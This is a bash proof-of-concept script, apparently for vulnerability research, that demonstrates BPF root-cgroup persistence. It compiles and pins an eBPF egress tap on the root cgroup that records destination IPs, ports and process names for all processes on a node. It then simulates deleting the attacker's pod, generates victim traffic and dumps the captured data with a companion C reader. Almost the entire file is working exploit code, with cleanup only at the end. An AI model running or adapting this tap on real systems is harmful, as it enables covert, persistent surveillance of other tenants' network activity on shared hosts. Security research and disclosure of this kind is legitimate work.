#!/bin/bash
# BPF Root-Cgroup Persistence PoC — Full Demo
# Color legend: RED=attacker, GREEN=victim, CYAN=reader, YELLOW=info

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

atk()  { echo -e "${RED}[ATTACKER]${NC} $*"; }
vic()  { echo -e "${GREEN}[VICTIM  ]${NC} $*"; }
rdr()  { echo -e "${CYAN}[READER  ]${NC} $*"; }
inf()  { echo -e "${YELLOW}[INFO    ]${NC} $*"; }
ok()   { echo -e "           ${BOLD}[+]${NC} $*"; }
sep()  { echo -e "${DIM}──────────────────────────────────────────────────────${NC}"; }

clear
echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║   BPF Root-Cgroup Persistence — CVE Research PoC    ║"
echo "║   Color key:                                         ║"
echo -e "║   ${RED}RED    = attacker actions${BOLD}                           ║"
echo -e "║   ${GREEN}GREEN  = victim (other tenant) actions${BOLD}              ║"
echo -e "║   ${CYAN}CYAN   = reader (data exfil) actions${BOLD}                ║"
echo -e "║   ${YELLOW}YELLOW = system info${BOLD}                                ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"
inf "Kernel: $(uname -r)    Host: $(hostname)"
sep

# ── Phase 0: toolchain + bpffs ─────────────────────────────────────────────
inf "Installing BPF toolchain (clang + libbpf-dev)..."
sudo apt-get install -y clang libbpf-dev 2>&1 | grep -E "^(Reading|Unpacking|Setting|Selecting|E:|clang)" || true

# clang may be versioned (clang-14, clang-15...) — find whichever is present
CLANG=$(command -v clang 2>/dev/null \
    || ls /usr/bin/clang-[0-9]* 2>/dev/null | sort -V | tail -1)
if [ -z "$CLANG" ]; then
    echo -e "${RED}[ERROR] clang not found. Try: sudo apt-get install -y clang${NC}" >&2
    exit 1
fi
ok "clang: $CLANG  ($(${CLANG} --version | head -1))"

inf "Checking /sys/fs/bpf (bpffs required for object pinning)..."
if ! mountpoint -q /sys/fs/bpf 2>/dev/null; then
    inf "/sys/fs/bpf not mounted — mounting bpffs now..."
    sudo mount -t bpf bpf /sys/fs/bpf/
fi
ok "/sys/fs/bpf is mounted"
sep

# ── Phase 1: write tap.bpf.c ───────────────────────────────────────────────
atk "Writing kernel-side BPF tap program (tap.bpf.c)"
cat > /tmp/tap.bpf.c << 'EOF'
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct capture_t {
    __u32 remote_ip;
    __u32 remote_port;
    char  comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 64);
    __type(key, __u32);
    __type(value, struct capture_t);
} cap_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} idx_map SEC(".maps");

SEC("cgroup_skb/egress")
int tap_egress(struct __sk_buff *skb)
{
    if (skb->family != 2) return 1;
    if (!skb->remote_ip4) return 1;

    __u32 k = 0;
    __u32 *idx = bpf_map_lookup_elem(&idx_map, &k);
    if (!idx) return 1;

    __u32 slot = *idx % 64;
    struct capture_t cap = {};
    cap.remote_ip   = skb->remote_ip4;
    cap.remote_port = bpf_ntohl(skb->remote_port) >> 16;
    bpf_get_current_comm(cap.comm, sizeof(cap.comm));
    bpf_map_update_elem(&cap_map, &slot, &cap, 0);

    __u32 nxt = *idx + 1;
    bpf_map_update_elem(&idx_map, &k, &nxt, 0);
    return 1;
}

char LICENSE[] SEC("license") = "GPL";
EOF
atk "Compiling tap.bpf.c → tap.bpf.o  ($CLANG -target bpf)"
$CLANG -O2 -target bpf -c /tmp/tap.bpf.c -o /tmp/tap.bpf.o
ok "tap.bpf.o compiled — BPF bytecode ready"

# ── Phase 2: write tap_reader.c ────────────────────────────────────────────
cat > /tmp/tap_reader.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <arpa/inet.h>

static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{ return (int)syscall(SYS_bpf, cmd, attr, size); }

struct capture_t { uint32_t remote_ip; uint32_t remote_port; char comm[16]; };

int main(void) {
    union bpf_attr obj = {};
    obj.pathname = (uint64_t)(uintptr_t)"/sys/fs/bpf/cap_map";
    int map_fd = sys_bpf(BPF_OBJ_GET, &obj, sizeof(obj));
    if (map_fd < 0) { perror("BPF_OBJ_GET cap_map"); return 1; }

    union bpf_attr qi = {};
    qi.pathname = (uint64_t)(uintptr_t)"/sys/fs/bpf/idx_map";
    int idx_fd = sys_bpf(BPF_OBJ_GET, &qi, sizeof(qi));
    uint32_t total = 64, k = 0, v = 0;
    if (idx_fd >= 0) {
        union bpf_attr lk = {};
        lk.map_fd = (uint32_t)idx_fd;
        lk.key    = (uint64_t)(uintptr_t)&k;
        lk.value  = (uint64_t)(uintptr_t)&v;
        if (sys_bpf(BPF_MAP_LOOKUP_ELEM, &lk, sizeof(lk)) == 0)
            total = v < 64 ? v : 64;
    }

    printf("\n\033[1;36m  %-5s %-20s %-8s %-16s\033[0m\n",
           "Slot","Destination IP","Port","Process");
    printf("  \033[2m%-5s %-20s %-8s %-16s\033[0m\n",
           "----","---------------","----","-------");

    int hits = 0;
    for (uint32_t i = 0; i < total; i++) {
        union bpf_attr lk = {};
        struct capture_t cap = {};
        lk.map_fd = (uint32_t)map_fd;
        lk.key    = (uint64_t)(uintptr_t)&i;
        lk.value  = (uint64_t)(uintptr_t)&cap;
        if (sys_bpf(BPF_MAP_LOOKUP_ELEM, &lk, sizeof(lk)) != 0) continue;
        if (!cap.remote_ip) continue;
        struct in_addr a = { .s_addr = cap.remote_ip };
        char ipbuf[32];
        inet_ntop(AF_INET, &a, ipbuf, sizeof(ipbuf));
        printf("  \033[1;33m%-5u\033[0m %-20s \033[1;32m%-8u\033[0m \033[1;35m%-16s\033[0m\n",
               i, ipbuf, cap.remote_port, cap.comm);
        hits++;
    }
    if (!hits)
        printf("  \033[2m(no captures yet)\033[0m\n");
    printf("\n  \033[1;31m%u connection(s) captured from OTHER processes on this node\033[0m\n", hits);
    printf("  \033[2mCollected by an orphaned BPF program — no container owns this data\033[0m\n\n");
    close(map_fd);
    return hits > 0 ? 0 : 2;
}
EOF
gcc -O2 -o /tmp/tap_reader /tmp/tap_reader.c
ok "tap_reader compiled"
sep

# ── Phase 3: ATTACKER plants the tap ───────────────────────────────────────
echo ""
atk "══ ATTACKER PHASE ══════════════════════════════════════"
atk "Cleaning any leftover pins from previous runs..."
sudo rm -f /sys/fs/bpf/poc_tap /sys/fs/bpf/cap_map /sys/fs/bpf/idx_map 2>/dev/null || true

atk "Loading BPF program and pinning to /sys/fs/bpf/..."
sudo bpftool prog load /tmp/tap.bpf.o /sys/fs/bpf/poc_tap \
    map name cap_map pinned /sys/fs/bpf/cap_map \
    map name idx_map pinned /sys/fs/bpf/idx_map
ok "BPF tap program pinned at /sys/fs/bpf/poc_tap"

atk "Attaching tap to ROOT cgroup with BPF_F_ALLOW_MULTI..."
sudo bpftool cgroup attach /sys/fs/cgroup egress \
    pinned /sys/fs/bpf/poc_tap multi
ok "Tap is LIVE — intercepting ALL egress on this node"

atk "Simulating container lifecycle (create + delete pod)..."
sudo mkdir -p /sys/fs/cgroup/poc-victim 2>/dev/null || true
ok "Attacker pod created"
sleep 0.5
sudo rmdir /sys/fs/cgroup/poc-victim 2>/dev/null || true
ok "Attacker pod DELETED — container is gone from the cluster"

echo ""
atk "Verifying tap persists AFTER pod deletion:"
PROG_ID=$(sudo bpftool cgroup show /sys/fs/cgroup 2>/dev/null | grep -oP 'id \K[0-9]+' | head -1)
echo -e "  ${RED}prog_id=${PROG_ID} still attached to /sys/fs/cgroup ← VULNERABILITY${NC}"
sep

# ── Phase 4: VICTIM generates traffic ──────────────────────────────────────
echo ""
vic "══ VICTIM PHASE (other tenants on the same node) ═══════"
vic "These processes have NO idea they are being monitored..."
echo ""

vic "curl http://example.com  (simulating tenant HTTP call)"
curl -s --max-time 5 http://example.com > /dev/null 2>&1 && ok "curl request completed" || ok "curl attempted"
sleep 0.3

vic "curl http://httpbin.org/get  (simulating API call with auth header)"
curl -s --max-time 5 http://httpbin.org/get > /dev/null 2>&1 && ok "API call completed" || ok "API call attempted"
sleep 0.3

vic "wget http://google.com  (simulating another tenant's traffic)"
wget -q --timeout=5 -O /dev/null http://google.com 2>/dev/null && ok "wget completed" || ok "wget attempted"
sleep 0.3

vic "DNS resolution for github.com  (captured at socket layer)"
host github.com > /dev/null 2>&1 || true
ok "DNS traffic generated"
sep

# ── Phase 5: READER dumps captured data ────────────────────────────────────
echo ""
rdr "══ READER PHASE (attacker's second pod, no CAP_NET_ADMIN) ══"
rdr "Opening /sys/fs/bpf/cap_map — pinned by the deleted attacker pod..."
rdr "Reading all traffic captured from victim processes:"
echo ""
sudo /tmp/tap_reader
sep

# ── Phase 6: verify tap still live ─────────────────────────────────────────
echo ""
inf "══ VERIFICATION ════════════════════════════════════════"
inf "bpftool cgroup tree — showing what is attached to the root cgroup:"
echo ""
sudo bpftool cgroup tree /sys/fs/cgroup 2>/dev/null | head -30
echo ""
inf "The tap (prog_id=${PROG_ID}) is still live."
inf "Every new pod started on this node is immediately under it."
sep

# ── Phase 7: cleanup ───────────────────────────────────────────────────────
echo ""
inf "══ CLEANUP ═════════════════════════════════════════════"
sudo bpftool cgroup detach /sys/fs/cgroup egress \
    pinned /sys/fs/bpf/poc_tap 2>/dev/null && ok "Detached from root cgroup"
sudo rm -f /sys/fs/bpf/poc_tap /sys/fs/bpf/cap_map /sys/fs/bpf/idx_map
ok "bpffs pins removed. Root cgroup is clean."
echo ""
